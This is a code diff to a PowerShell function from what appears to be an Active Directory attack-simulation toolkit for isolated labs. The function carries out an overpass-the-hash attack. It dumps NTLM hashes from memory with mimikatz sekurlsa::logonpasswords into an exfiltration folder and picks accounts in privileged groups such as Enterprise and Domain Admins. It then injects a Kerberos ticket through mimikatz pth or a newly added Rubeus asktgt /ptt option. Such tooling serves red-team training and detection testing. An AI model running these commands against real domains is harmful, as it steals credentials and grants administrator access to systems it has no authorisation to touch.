@@ -48,17 +48,14 @@ function Invoke-OverPassTheHashAttack {
     Write-AS2GoOutput -Type Header -Message "Starting Overpass-the-Hash (OpTH) Attack on Lab PC"
     Write-AS2GoOutput -Type H1 -Message $((Get-Help (Get-FunctionName)).Functionality)
 
-
     Write-AS2GoOutput -Type NextCommand -Message "Next Command: " -NoNewline
     $command = ".\mimikatz.exe  'privilege::debug' 'sekurlsa::logonpasswords' 'exit'"
     Write-AS2GoOutput -Type Command -NoExtraLines -Message $command
 
- 
 
     $decision = "ExtractNew"
 
     If (-not $unattended) {
-
 
         $message = @"
 Please confirm that the following prerequisites are met in the isolated test environment:
@@ -105,35 +102,10 @@ Please confirm that the following prerequisites are met in the isolated test env
             return
         }
 
-
         $title = "NTLM Hash Availability"
-        $message = "Choose whether to reuse a previously extracted NTLM hash, extract one using `nsekurlsa::logonpasswords, or enter one manually for the OpTH simulation."
+        $message = "Choose whether to extract an NTLM hash using sekurlsa::logonpasswords or enter one manually for the OpTH simulation."
 
-        $helpPrevious = "Use a previously extracted NT hash for the test account."
         $helpSkip = "Skip the Overpass-the-Hash (OpTH) simulation."
-
-
-        $ntlmHash = Get-ASConfig -Setting "ASP07NT"
-
-        If ([string]::IsNullOrEmpty($ntlmHash)) {
-            Write-log -Message 'No valid NTLM hash data found. '
-            $helpPrevious = ""
-        }
-        else {
-            if (($ntlmHash.split("|")).count -eq 3) {
-                Write-log -Message "Use a previously extracted NTLM hash data: $ntlmHash"
-                $helpPrevious = "Use a previously extracted NTLM hash data: $ntlmHash"
-            }
-            else {
-                Write-log -Message 'No valid NTLM hash data found. '
-                $helpPrevious = ""
-            }
-        }
-
-
-
-
-        # $helpPrevious = ""
 
         if (-not $SafeMode) {
 
@@ -142,11 +114,6 @@ Please confirm that the following prerequisites are met in the isolated test env
                     Label = "&Extract New"
                     Help  = "Run sekurlsa::logonpasswords to attempt to extract the test account's NTLM hash."
                     Value = "ExtractNew"
-                }
-                [pscustomobject] @{
-                    Label = "&Use Previous"
-                    Help  = $helpPrevious
-                    Value = "UsePrevious"
                 }
                 [pscustomobject] @{
                     Label = "&Add Manually"
@@ -186,15 +153,8 @@ Please confirm that the following prerequisites are met in the isolated test env
 
     }
 
-    If ($decision -eq "UsePrevious") {
-
-        $temp = $ntlmHash.split("|")
-        $Script:ASFQDN = $temp[0]
-        $Global:ASHelpDeskUser = $temp[1]
-        $Script:ASPtHntml = $temp[2]
-    }
-    elseif ($decision -eq "ExtractNew") {
-    
+    If ($decision -eq "ExtractNew") {
+  
 
         $name = get-date -Format 'yyyyMMddhhmmss'
         $CredentialDump = "$($Script:DefautExfiltrationFolder)\$name.pth"
@@ -253,7 +213,7 @@ Please confirm that the following prerequisites are met in the isolated test env
 
        
         Write-AS2GoOutput -Type H1 -Message "All Principals."
-        $BestResults  | Select-Object Domain, Username, NTLM, GroupMembershipRids | out-host
+        $BestResults  | Select-Object Domain, Username, NTLM, GroupMembershipRids, SID | ft | out-host
 
         $BestPrincipal = foreach ($Rid in 519, 512, 548) {
             $MatchForRid = $BestResults | Sort-Object -Property LogonTime -Descending |
@@ -288,9 +248,6 @@ Please confirm that the following prerequisites are met in the isolated test env
         $Global:ASHelpDeskUser = $BestResults[$SelectedIndex].UserName
         $Script:ASPtHntml = $BestResults[$SelectedIndex].NTLM
 
-
-
-
     
         Write-AS2GoOutput -Type Info -Message "Finished extracting logon sessions from $CredentialDump."
     }
@@ -300,37 +257,73 @@ Please confirm that the following prerequisites are met in the isolated test env
     }
 
 
-
-
-
     Write-AS2GoOutput -Type NextCommand -Message "Command:" -NoExtraLines -NoNewLine
     Write-Highlight -Text ".\mimikatz.exe ", """privilege::", "debug", """ ""sekurlsa::", "pth", " /user:", $Global:ASHelpDeskUser , " /ntlm:", $Script:ASPtHntml, " /domain:", $Script:ASFQDN, """ ""exit"""   `
         -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS
     Write-Host ""
 
-    $answer = Show-DecisionPrompt
 
-    If ($answer -eq $Script:No) {
-        Measure-FunctionRuntime -End -Details $Info
-        return
+    Write-As2GoOutput -Type Command -Message "$($Script:ASTools)\Rubeus.exe asktgt /user:$($Global:ASHelpDeskUser) /domain:$($Script:ASFQDN) /rc4:$($Script:ASPtHntml) /ptt /nowrap"
+
+    $Options = @(
+        [pscustomobject] @{
+            Label = "&Rubeus"
+            Help  = "NO to cancel"
+            Value = "Rubeus"
+        },
+        [pscustomobject] @{
+            Label = "&Mimikatz"
+            Help  = "YES to proceed"
+            Value = "Mimikatz"
+        },
+        [pscustomobject] @{
+            Label = "&Skip"
+            Help  = "SKIP to bypass this operation"
+            Value = $Script:Skip
+        }
+    )
+
+    $Title = "Decision Required"
+    $message = "Please make a decision:"
+    $answer = Show-DecisionPrompt -Message $message -Options $Options -Default 0 -Title $title
+
+    If ($answer -eq "Mimikatz") {
+        Invoke-Command -ScriptBlock {
+            & "$($Script:ASTools)\mimikatz.exe" `
+                "privilege::debug" `
+                "sekurlsa::pth /user:$Global:ASHelpDeskUser /ntlm:$Script:ASPtHntml /domain:$Script:ASFQDN /run:pwsh.exe" `
+                "exit"
+        }
+
+        Write-AS2GoOutput -Type Header -Message "Use the New Command Window"
+        Write-AS2GoOutput -Type Info -Message "The overpass-the-hash command opened a new command window for the ticket injection."
+        Write-AS2GoOutput -Type NextCommand -Message "Please run the following command from the new terminal window" -NoExtraLines
+        Write-AS2GoOutput -Type Command -NoExtraLines -Message "dir $($env:LogonServer)\c$"
+    }
+    elseif ($answer -eq "Rubeus") {
+
+        Invoke-Command -ScriptBlock {
+            & "$($Script:ASTools)\Rubeus.exe" asktgt /user:$Global:ASHelpDeskUser /domain:$Script:ASFQDN /rc4:$Script:ASPtHntml /ptt /nowrap
+        }
+        Test-AccessToOneDCPerDomain
+        $tickets = Get-KlistTicket
+        $tickets | Format-Table TicketNumber, Client, Server, EncryptionType, EndTime -AutoSize
+        Write-AS2GoOutput -Type Info -Message "Last Ticket"
+        $tickets | Select-object -Last 1 | Format-List
+
+    }
+    elseif ($answer -eq $Script:Skip) {
     }
 
-
-    Invoke-Command -ScriptBlock {
-        & "$($Script:ASTools)\mimikatz.exe" `
-            "privilege::debug" `
-            "sekurlsa::pth /user:$Global:ASHelpDeskUser /ntlm:$Script:ASPtHntml /domain:$Script:ASFQDN /run:pwsh.exe" `
-            "exit"
-    }
-
-    Write-AS2GoOutput -Type Header -Message "Use the New Command Window"
-    Write-AS2GoOutput -Type Info -Message "The overpass-the-hash command opened a new command window for the ticket injection."
-    Write-AS2GoOutput -Type NextCommand -Message "Please run the following command from the new terminal window" -NoExtraLines
-    Write-AS2GoOutput -Type Command -NoExtraLines -Message "00.cmd"
 
     if (-not $UnAttended ) { pause }
 
-    Set-ASConfig -Setting "ASP07NT" -Value "$($Script:ASFQDN)|$($Global:ASHelpDeskUser)|$($Script:ASPtHntml)"
+    $Title = "Was the operation successful?"
+    $message = "Do you want to save the hash credentials?"
+    $answer = Show-DecisionPrompt -Message $message  -Default 0 -Title $title
+    If ($answer -eq $Script:Yes) {
+        Set-ASConfig -Setting "ASP07NT" -Value "$($Script:ASFQDN)|$($Global:ASHelpDeskUser)|$($Script:ASPtHntml)" -DPAPI
+    }        
    
     Measure-FunctionRuntime -End -Details $Info
 }
